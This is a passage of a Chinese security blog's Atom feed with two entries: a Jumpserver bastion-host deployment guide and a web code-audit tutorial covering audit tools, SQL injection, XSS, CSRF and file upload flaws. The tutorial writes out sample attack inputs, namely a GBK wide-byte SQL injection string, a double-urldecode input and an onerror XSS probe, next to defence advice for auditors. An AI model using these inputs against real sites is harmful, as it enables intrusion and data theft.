<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DiZai</title>
  
  <subtitle>Just do IT</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-13T13:48:24.297Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>迪仔</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Jumpserver的部署和基本使用</title>
    <link href="http://yoursite.com/2018/08/13/Jumpserver%E7%9A%84%E9%83%A8%E7%BD%B2%E5%92%8C%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/13/Jumpserver的部署和基本使用/</id>
    <published>2018-08-13T13:25:05.000Z</published>
    <updated>2018-08-13T13:48:24.297Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。</p></blockquote><a id="more"></a><h3 id="0x01-【安装环境】"><a href="#0x01-【安装环境】" class="headerlink" title="0x01 【安装环境】"></a>0x01 【安装环境】</h3><p><strong>CentOS Linux release 7.5.1804 (Core)</strong> </p><h3 id="0x02-【准备】"><a href="#0x02-【准备】" class="headerlink" title="0x02 【准备】"></a>0x02 【准备】</h3><p><strong>本次是使用docker安装jumpserver，所以要先在CentOS 7环境下安装Docker。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br><span class="line"></span><br><span class="line">yum -y install docker</span><br><span class="line"></span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h4 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="/images/Jumpserver/9.png" alt="upload successful"></p><h4 id="配置Docker"><a href="#配置Docker" class="headerlink" title="配置Docker"></a>配置Docker</h4><p><strong>设置镜像</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">\&gt;&#123;</span><br><span class="line"></span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>重启Docker</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure></p><h3 id="0x03-【安装步骤】"><a href="#0x03-【安装步骤】" class="headerlink" title="0x03 【安装步骤】"></a>0x03 【安装步骤】</h3><h3 id="Docker快速启动"><a href="#Docker快速启动" class="headerlink" title="Docker快速启动"></a>Docker快速启动</h3><p><strong>使用 root 命令行输入:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></p><p><strong>访问</strong></p><p><strong>浏览器访问: http://&lt;容器所在服务器IP&gt;:8080</strong></p><p><strong>SSH访问: ssh -p 2222 &lt;容器所在服务器IP&gt;</strong></p><p><strong>XShell等工具请添加connection连接</strong></p><p><strong>额外环境变量</strong></p><ul><li><strong>DB_ENGINE = mysql</strong></li><li><strong>DB_HOST = mysql_host</strong></li><li><strong>DB_PORT = 3306</strong></li><li><strong>DB_USER = xxx</strong></li><li><strong>DB_PASSWORD = xxxx</strong></li><li><strong>DB_NAME = jumpserver</strong></li><li><strong>REDIS_HOST = <redis-host></redis-host></strong></li><li><strong>REDIS_PORT = <redis-port></redis-port></strong></li><li><strong>REDIS_PASSWORD = &lt;</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 -e DB_ENGINE=mysql -e DB_HOST=192.168.1.1 -e DB_PORT=3306 -e DB_USER=root -e DB_PASSWORD=xxx -e DB_NAME=jumpserver  registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></li></ul><p><img src="/images/Jumpserver/1.png" alt="upload successful"></p><p><strong>以上是实现在Docker下的安装，不过不建议在生产中使用, 因为所有软件都打包到一个Docker中了，不是Docker最佳实践。</strong></p><p><strong>在CentOS中安装请参考：<a href="http://docs.jumpserver.org/zh/docs/dockerinstall.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/dockerinstall.html</a></strong></p><h2 id="0x04-【快速入门】"><a href="#0x04-【快速入门】" class="headerlink" title="0x04 【快速入门】"></a>0x04 【快速入门】</h2><h4 id="架构说明"><a href="#架构说明" class="headerlink" title="架构说明"></a>架构说明</h4><p><img src="/images/Jumpserver/2.png" alt="upload successful"></p><h4 id="组件说明"><a href="#组件说明" class="headerlink" title="组件说明"></a>组件说明</h4><p><strong>jumpserver</strong></p><p>现指jumpserver管理后台，是核心组件（Core），使用Django Class BasedV 风格开发，支持Restful API</p><p><strong>COCO</strong></p><p>实现SSH Server和Web Terver的组件，提供SSH和WebSocket接口，使用Paramiko和Flask开发。</p><p><strong>Luna</strong></p><p>现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。</p><p><strong>Guacamole</strong></p><p>Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用。</p><p><strong>基本设置</strong></p><p>修改 URL 的 localhost 为你的实际 url 地址，否则邮件收到的地址将为 localhost 修改完 url 地址后需要重启 jumpserver 服务（重启才能生效，后续会解决这个问题）</p><p><img src="/images/Jumpserver/3.png" alt="upload successful"></p><p><strong>创建管理用户</strong><br><img src="/images/Jumpserver/4.png" alt="upload successful"></p><p># 如果使用ssh私钥管理资产，需要先在资产上设置，这里举个例子供参考（本例登录资产使用root为例） (1). 在资产上生成 root 账户的公钥和私钥    $ ssh-keygen -t rsa  # 默认会输入公钥和私钥文件到 ~/.ssh 目录 </p><p>连续三次回车后。生成了本机的私钥和公钥</p><p> (2). 将公钥输出到文件 authorized_keys 文件，并修改权限    $ cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys   $ chmod 400 ~/.ssh/authorized_keys</p><p> <img src="/images/Jumpserver/5.png" alt="upload successful"></p><p> (3). 打开RSA验证相关设置    $ vim /etc/ssh/sshd_config    RSAAuthentication yes   PubkeyAuthentication yes   AuthorizedKeysFile     .ssh/authorized_keys  (4). 重启 ssh 服务   $ service sshd restart  (5). 上传 ~/.ssh 目录下的 id_rsa 私钥到 jumpserver 的管理用户中  </p><p>sz id_rsa   #下载私钥到本地，再上传到jumpserver中</p><p># 这样就可以使用 ssh私钥 进行管理服务器  # 名称可以按资产树来命名。用户名root。密码和 SSH 私钥必填一个</p><p><strong>创建资产</strong><br><img src="/images/Jumpserver/6.png" alt="upload successful"></p><p># 点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。 # 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。 # IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能”牢靠”地登录指定的 IP 主机上。 资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。</p><p><strong>创建Windows系统用户</strong></p><p># 目前 Windows 暂不支持自动推送，用户必须在系统中存在且有权限使用远程连接，请确认资产的防火墙已经开放 注：Windows 资产协议务必选择 rdp # 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息</p><p><img src="/images/Jumpserver/7.png" alt="upload successful"></p><p><strong>创建Widoows资产</strong></p><p># 同创建 Linux 资产一样。 # 创建 Windows 资产，系统平台请选择正确的 Windows，默认 RDP 端口号为3389，IP 和 管理用户请正确选择， 注：确保管理用户能正确登录到指定的 IP 主机上</p><p><img src="/images/Jumpserver/8.png" alt="upload successful"></p><p><strong>Windwos资产连接说明：<a href="http://docs.jumpserver.org/zh/docs/faq_windows.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/faq_windows.html</a></strong></p><p><strong>Web终端</strong></p><p>Web 终端是资产使用界面，管理员和用户都是从这里登录到资产上，执行操作。点击资产名字连接资产，点击”Server”下的”Disconnect”断开资产连接。</p><p><img src="/images/Jumpserver/10.png" alt="upload successful"></p><p><strong>历史会话</strong></p><p>历史会话同在线会话包含的信息一样，都有用户、资产和 IP 地址等信息。Jumpserver 提供历史会话的录像观看。点击左侧的”回放”按钮，即可观看录像。</p><p><img src="/images/Jumpserver/11.png" alt="upload successful"></p><p><strong>更多文档参考：<a href="http://docs.jumpserver.org/zh/docs/admin_guide.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/admin_guide.html</a></strong></p><p><strong>安装问题：<a href="http://docs.jumpserver.org/zh/docs/faq_install.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/faq_install.html</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全维护" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E7%BB%B4%E6%8A%A4/"/>
    
    
      <category term="服务部署" scheme="http://yoursite.com/tags/%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Web 安全 代码审查之常规漏洞</title>
    <link href="http://yoursite.com/2018/08/12/Web-%E5%AE%89%E5%85%A8-PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5%E4%B9%8B%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/12/Web-安全-PHP-代码审查之常规漏洞/</id>
    <published>2018-08-12T14:39:00.000Z</published>
    <updated>2018-08-12T15:40:43.251Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><blockquote><p>工欲善其事，必先利其器。我们做代码审计之前选好工具也是十分必要的。下面我给大家介绍两款代码审计中比较好用的工具。</p></blockquote><a id="more"></a><h4 id="什么是源代码审查？"><a href="#什么是源代码审查？" class="headerlink" title="什么是源代码审查？"></a>什么是源代码审查？</h4><p>检查源代码中的缺点和错误信息，分析并找到这些问题引发的安全漏洞，并提供代码修订措施和建议;是一种以发现程序错误，安全漏洞和违反程序规范，为目标的源代码分析</p><p><strong>MVC设计模型：</strong></p><p><img src="/images/代码审计/1.png" alt="upload successful"></p><p><strong>Struts简介：</strong><br>Struts是Apache软件基金下一个项目。Struts有一组相互协作的类（组件）、Servlet以及jsp tag lib组成。基于struts构架的web应用程序基本上符合JSP Model2的设计标准，可以说是MVC设计模式的一种变化类型。  根据上面对framework的描述，很容易理解为什么说Struts是一个web framework，而不仅仅是一些标记库的组合。  但 Struts 也包含了丰富的标记库和独立于该框架工作的实用程序类。Struts有其自己的控制器（Controller），同时整合了其他的一些技术去实现模型层（Model）和视图层（View）。在模型层，Struts可以很容易的与数据访问技术相结合，包括EJB，JDBC和Object Relation Bridge。在视图层，Struts能够与JSP, Velocity Templates,XSL等等这些表示层组件相结合</p><p><strong>ZF框架：</strong><br>    Zend Framework(简写ZF)是由 Zend 公司支持<br>开发的完全基于 PHP5 的开源PHP开发框架，<br>可用于开发 Web 程序和服务，<br>ZF采用 MVC(Model–View-Controller) 架构模式<br>来分离应用程序中不同的部分方便程序的开发和维护。</p><p><strong>代码审计的方式</strong><br>通读原文：函数集文件、配置文件、安全过滤文件、index文件<br>程序结构：浏览源码文件夹，了解程序的大致目录<br>入口文件：web.xml、struts-xx.xml、spring-xxx.xml文件一般是整个程序的入口，从中可知道：程序的架构、运行流程、包含哪些配置文件、包含哪些过滤文件和安全过滤文件、了解程序的业务逻辑<br>配置文件：一般类似config.properties 等文件，保存一些数据库相关信息、程序的一些信息。<br>先看数据库编码，如果是gbk可能存在宽字节注入。<br>若变量的值用双引号、则可能存在双引号解析代码执行的问题<br>过滤功能：通过详读公共函数文件和安全过滤文件等文件，清晰掌握：<br>用户输入的数据，哪些被过滤，哪些无过滤如何过滤。<br>在哪里被过滤了？<br>如何过滤，过滤的方式是替换还是正则，有没有GPC，有没有使用 addslasher()处理？<br>能否绕过过滤的数据。</p><h3 id="0x02-代码审计工具1：Fortify-SCA"><a href="#0x02-代码审计工具1：Fortify-SCA" class="headerlink" title="0x02 代码审计工具1：Fortify SCA"></a>0x02 代码审计工具1：Fortify SCA</h3><p>Fortify SCA 是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。扫描的结果中不但包括详细的安全漏洞的信息，还会有相关的安全知识的说明，以及修复意见的提供。</p><p><strong>工作原理</strong><br>Foritfy SCA 首先通过调用语言的编译器或者解释器把前端的语言代码（如JAVA，C/C++源代码）转换成一种中间媒体文件NST（Normal Syntax Tree）将其源代码之间的调用关系，执行环境，上下文等分析清楚。然后再通过上述的五大分析引擎从五个切面来分析这个NST，匹配所有规则库中的漏洞特征，一旦发现漏洞就抓取出来。最后形成包含详细漏洞信息的FPR结果文件，用AWB打开查看。<br><img src="/images/代码审计/2.png" alt="upload successful"></p><p><strong>扫描结果：</strong><br>Fortify SCA 的结果文件为.FPR文件，包括详细的漏洞信息：漏洞分类，漏洞产生的全路径，漏洞所在的源代码行，漏洞的详细说明及修复建议等<br><img src="/images/代码审计/3.png" alt="upload successful"><br>目前Fortify SCA可以扫描出约350种漏洞，Fortify将所有安全漏洞整理分类，根据开发语言分项目，再细分为8个大类，约350个子类</p><h3 id="0x03-代码审计工具2：Seay源代码审计工具"><a href="#0x03-代码审计工具2：Seay源代码审计工具" class="headerlink" title="0x03 代码审计工具2：Seay源代码审计工具"></a>0x03 代码审计工具2：Seay源代码审计工具</h3><p><strong>功能介绍</strong><br>这些是seay 第一个版本的部分功能，现在最新版本是2.1、傻瓜化的自动审计、支持php代码调试、函数/变量定位、生成审计报告、自定义审计规则、mysql数据库管理、黑盒敏感信息泄露一键审计、支持正则匹配调试 、编辑保存文件、POST数据包提交 。<br><img src="/images/代码审计/4.png" alt="upload successful"><br><strong>安装方法</strong><br>安装环境需要 .NET2.0以上版本环境才能运行，下载安装包之后点击下一步就安装好了，非常的简便。<br>安装包下载地址：<a href="http://enkj.jb51.net:81/201408/tools/Seayydmsjxt(jb51.net).rar" target="_blank" rel="noopener">http://enkj.jb51.net:81/201408/tools/Seayydmsjxt(jb51.net).rar</a></p><h3 id="0x04-代码审计工具3：RIPS"><a href="#0x04-代码审计工具3：RIPS" class="headerlink" title="0x04 代码审计工具3：RIPS"></a>0x04 代码审计工具3：RIPS</h3><p><strong>文献参考：<a href="https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg</a></strong><br><strong>功能介绍</strong><br>RIPS 是一款基于 PHP 开发的针对 PHP 代码安全审计的软件。<br>另外，它也是一款开源软件，由国外安全研究员 Johannes Dahse 开发，程序只有 450KB，目前能下载到的最新版是0.55。<br>在写这段文字之前笔者特意读过它的源码，它最大的亮点在于调用了 PHP 内置解析器接口token_get_all，<br>并且使用Parser做了语法分析，实现了跨文件的变量及函数追踪，扫描结果中非常直观地展示了漏洞形成及变量传递过程，误报率非常低。<br>RIPS 能够发现 SQL 注入、XSS 跨站、文件包含、代码执行、文件读取等多种漏洞，支持多种样式的代码高亮。比较有意思的是，它还支持自动生成漏洞利用。<br><img src="/images/代码审计/5.png" alt="upload successful"></p><p><strong>安装方法</strong><br>下载地址：<a href="https://jaist.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip" target="_blank" rel="noopener">https://jaist.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip</a>.<br>解压到任意一个PHP的运行目录<br>在浏览器输入对应网址，可以通过下图看到有一个path 在里面填写你要分析的项目文件路径，点击 scan.</p><h3 id="0x05-代码审计实战"><a href="#0x05-代码审计实战" class="headerlink" title="0x05 代码审计实战"></a>0x05 代码审计实战</h3><p>通过刚才安装的两个审计工具运行后我们可以发现，会分析出很多隐藏的漏洞，那下面我们看看其中的SQL注入、XSS、CSRF产生的原因,通过原因来分析如何去审计代码。</p><h4 id="SQL-Injection-（SQL-注入攻击）"><a href="#SQL-Injection-（SQL-注入攻击）" class="headerlink" title="SQL Injection （SQL 注入攻击）"></a>SQL Injection （SQL 注入攻击）</h4><p>SQL注入攻击（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。</p><p><strong>SQL注入产生的原因</strong><br>程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行</p><p><strong>编码注入方式</strong><br>宽字节注入，这个是怎么回事呢？<br>在实际环境中程序员一般不会写上面类似的代码，一般都会用addslashes()等过滤函数对从web传递过来的参数进行过滤。不过有句话叫做，道高一尺魔高一丈，我们看看白帽子是怎么突破的。用PHP连接MySQL的时候，当设置 character_set_client=gbk时候会导致一个编码漏洞。我们知道addslashes() 会把参数 1’ 转换成 1\’,而我们提交参数 1%df’ 时候会转成 1縗’，那我们输入 1%df’ or 1=1%23时候，会被转换成 1縗’ or 1=1#’。<br>简单来说%df’会被过滤函数转义为%df\’ ，%df\’ = %df%5c%27  在使用gbk编码的时候会认为%df%5c是一个宽字节%df%5c%27=縗’，这样就会产生注入。<br>那如何防御这个宽字节呢？我希望大家开发网站尽量使用UTF8编码格式，如果转换麻烦，最安全的方法就是使用PDO预处理。挖掘这种漏洞主要是检查是否使用了gbk，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 。<br>二次urldecode注入，这中方式也是因为使用了urldecode不当所引起的漏洞。<br>我们刚才知道了 addslashes()函数可以防止注入，他会在(‘)、(“)、()前面加上反斜杠来转义。<br>那我们假设我们开启了GPC，我们提交了一个参数，/test.php?uid=1%2527,因为参数中没有单引号，所以第一次解码会变成uid=1%27,%25解码出来就是%，<br>这时候程序里如果再去使用urldecode来解码，就会把%27解码成单引号(‘)，最终的结果就是uid=1’.<br>我们现在知道了原有是因为urldecode引起的，我们可以通过编辑器的搜索urldecode和rawurldecode找到二次url漏洞。</p><p><strong>从漏洞类型区分可以分为三种类型</strong><br>可显：攻击者可以直接在当前界面内容中获取想要获得的内容。<br>报错：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中。<br>所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，所以我建议在数据库类中设置不抛出错误信息。<br>盲注：数据库查询结果无法从直观页面中获取攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。</p><p><strong>SQL 注入漏洞挖掘方法</strong><br>针对上面提到的利用漏洞方法，总结了以下的挖掘方法：<br>参数接收位置，检查是否有没过滤直接使用  _POST、$_COOKIE 参数的。<br>SQL语句检查，搜索关键词 select update insert 等SQL语句关键处，检查SQL语句的参数是否可以被控制。<br>宽字节注入,如果网站使用的 GBK 编码情况下，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 就行。<br>二次 urldecode 注入，少部分情况，gpc 可以通过编辑器的搜索 urldecode 和 rawurldecode 找到二次url漏洞。</p><p><strong>SQL 注入漏洞防范方法</strong><br>虽然SQL注入漏洞非常多，但是防范起来却挺简单的，下面介绍几个过滤函数和类:<br>gpc/rutime 魔术引号<br>过滤函数和类<br>addslashes<br>mysql_real_escape_string<br>intval<br>PDO 预处理  </p><p><strong>SQL注入过程</strong>  </p><ol><li>攻击者访问登录页面  </li><li>输入用户名及密码  </li><li>将含有攻击字符串组成SQL语句转发给数据库执行  </li><li>数据库执行发回应用程序服务器  </li><li>应用程序将内容返回浏览器，即绕过成功  </li></ol><h4 id="XSS（Cross-Site-Scripting）"><a href="#XSS（Cross-Site-Scripting）" class="headerlink" title="XSS（Cross-Site Scripting）"></a>XSS（Cross-Site Scripting）</h4><p>跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。<br>XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。在 WEB2.0 时代，强调的是互动，使得用户输入信息的机会大增，在这个情况下，我们作为开发者，在开发的时候，要提高警惕。<br><img src="/images/代码审计/6.png" alt="upload successful"></p><p><strong>xss 漏洞分类</strong><br>1.反射型，危害小，一般<br>反射型XSS原理：就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。比如hack甲构造好修改密码的URL并把密码修改成123，但是修改密码只有在登陆方乙才能修改，乙在登陆的情况下点击甲构造好的URL将直接在不知情的情况下修改密码。<br>特点是：非持久化，必须用户点击带有特定参数的链接才能引起。<br>反射型XSS是比较普遍的XSS，其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重，如在输入框的name中输入<meta http="" equiv="refresh" content="5">，服务器不加处理，将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。  </p><p>2.存储型，危害大，影响时间长<br>存储型XSS原理，假设你打开了一篇正常的文章页面，下面有评论功能。这个时候你去评论了一下，在文本框中输入了一些JavaScript代码，提交之后,你刷新这个页面后发现刚刚提交的代码又被原封不动的返回来并且执行了。<br>这个时候你会想,我要写一段 JavaScript 代码获取 cookie 信息，然后通过ajax发送到自己的服务器去。构造好代码后你把链接发给其他的朋友，或者网站的管理员，他们打开 JavaScript 代码就执行了，你服务器就接收到了sessionid，你就可以拿到他的用户权限了。</p><p>3.dom型，特殊的一种<br>dom型 XSS 是因为 JavaScript 执行了dom 操作，所造成的 XSS 漏洞，具体如下图。可以看到虽然经过 html 转义了，但是这块代码在返回到 html 中，又被 JavaScript 作为 dom 元素操作。那当我输入如下代码的时候依然会存在 XSS 漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure></p><p><strong>漏洞思路：搜索内容、发表文章、留言、评论回复</strong></p><p><strong>xss 漏洞挖掘方法</strong><br>根据上面的一些特点，可以总结出几个分析出几个挖掘方法：<br>数据接收位置，检查 _POST、$_COOKIE是否经过转义。<br>常见的反射型XSS搜索这种类似位置发现次数较多。<br>而存储型在文章，评论出现比较多。</p><p><strong>XSS 漏洞防范方法</strong><br>1.转义html实体，有两种方式：在入口和出口,我建议是在入口处转义，防止出口位置取出来的时候忘记转义，如果已经在入口转义了，出口位置就不用再次转义。<br>2.在富文本编辑器中，经常会用到一些元素的属性，比如上图的onerror，那我们还需对元素的属性建立黑白名单。<br>3httpOnly 即使存在xss漏洞，可以把危害大大降低。<br>4.对所有输入中的script、iframe等字样进行严格的检查<br>5.验证数据的类型及其格式、长度、范围和内容<br>6.客户端做数据的验证与过滤，关键的过滤步骤在服务端进行检查<br>7.入参和出参校验<br>(1)“&lt;  &gt;” 可以引入一个标签或者结束一个标签。<br>(2) “&amp;” 可以引入一个字符实体。<br>(3)对于外加双引号的属性值，双引号(””)是特殊字符，因为它们标记了该属性值的结束。<br>(4) 对于外加单引号的属性值，单引号(‘’)是特殊字符，因为它们标记了该属性值的结束<br>8.URL重定向校验<br>（1）空格符、制表符和换行符标记了 URL 的结束。<br>（2） “&amp;” 引入一个字符实体<br>（3）非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。<br>（4）在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。</p><h4 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h4><p><strong>CSRF 漏洞介绍</strong><br>CSRF（Cross-site request forgery）跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户。<br>而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br>csrf 主要用来做越权操作，而且 csrf 一直没有被关注起来，所以很多程序现在也没有相关的防范措施。</p><p><strong>漏洞危害</strong><br>攻击者盗用了你的身份信息，以你的名义发送恶意请求。<br>以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等<br>造成的问题包括：个人隐私泄露以及财产安全。</p><p><strong>CSRF 案例</strong><br>我们来看下面的一段代码,这个表单当被访问到的时候，用户就退出了登录。假设有一个转账的表单，只需要填写对方的用户名，和金额就可以，那如果我提前把 URL 构造好，发给受害者，当点击后，钱就被转走了。<br>或者我把这个 URL 放到我的网页中，通过&lt;img src=”我构造的URL” ，当其他人打开我的网址后，就中招了。</p><p><strong>攻击流程</strong><br><img src="/images/代码审计/7.png" alt="upload successful"></p><p><strong>CSRF漏洞挖掘方法</strong><br>通过上面的描述，我们知道了漏洞的原有，那我们审计的时候可以检查处理表单有没有以下判断。<br>是否有验证 token。<br>是否有图片验证码。<br>是否有 refe 信息。<br>如果三个判断都没有，那么就存在了 CSRF 漏洞，CSRF 不仅限于 GET 请求， POST 请求同样存在。<br>CSRF 漏洞防范方法<br>图片验证码，这个想必大家都知道，但是用户体验并不好，我们可以看下面的一些处理方法。<br>token验证。<br>token验证方法如下，每次访问表单页的时候，生成一个不可预测的token存放在服务器session中，另外一份放页面中，提交表单的时候需要把这个token带过去，接收表单的时候先验证一下token是否合法。<br>Referer信息验证<br>大多数情况下，浏览器访问一个地址，其中header头里面会包含Referer信息,里面存储了请求是从哪里发起的。<br>如果HTTP头里包含有Referer的时候，我们可以区分请求是同域下还是跨站发起的，所以我们也可以通过判断有问题的请求是否是同域下发起的来防御 CSRF 攻击。<br>Referer 验证的时候有几点需要注意，如果判断Referer是否包含 *.XXX.com,如果有子域名有漏洞，会存在绕过的可能。<br>如果判断的条件的是Referer中是否包含字符 ‘xxx.com’  那攻击者在他目录中建立一个 xxx.com 文件夹同样存在绕过的可能。如果可以最合适的判断是，直接判断是否等于当前域名。</p><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><p><strong>漏洞危害</strong><br>上传文件的时候，服务器端脚本语言未对上传的文件进行严格的验证和过滤，就有可能上传恶意的文件，从而控制整个网站，甚至是服务器。</p><p><strong>漏洞条件</strong><br>文件可以上传、知道文件上传的路径、上传文件可以被访问、上传文件可以被执行</p><p><strong>文件上传可控点</strong><br>Content-Length,即上传内容大小<br>MAX_FILE_SIZE,即上传内容的最大长度<br>filename,即上传文件名<br>Content-Type,即上传文件类型<br>请求包中的乱码字段，即是所上传文件的内容<br>有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</p><p><strong>挖掘思路</strong><br>上传点都调用同一个上传类，直接全局搜索上传函数<br>黑盒寻找上传点，代码定位</p><p><strong>代码案例</strong><br>name：客户端的原始上传文件名称<br>Type：上传文件的MIME类型<br>Tmp_name：服务器端用来保存上传文件的临时文件路径<br>Error：上传文件时的错误信息<br>Size：上传文件的大小，单位</p><p><strong>文件上传绕过客户端</strong><br>用firebug将form表单中的onsubmit事件删除<br>上传木马文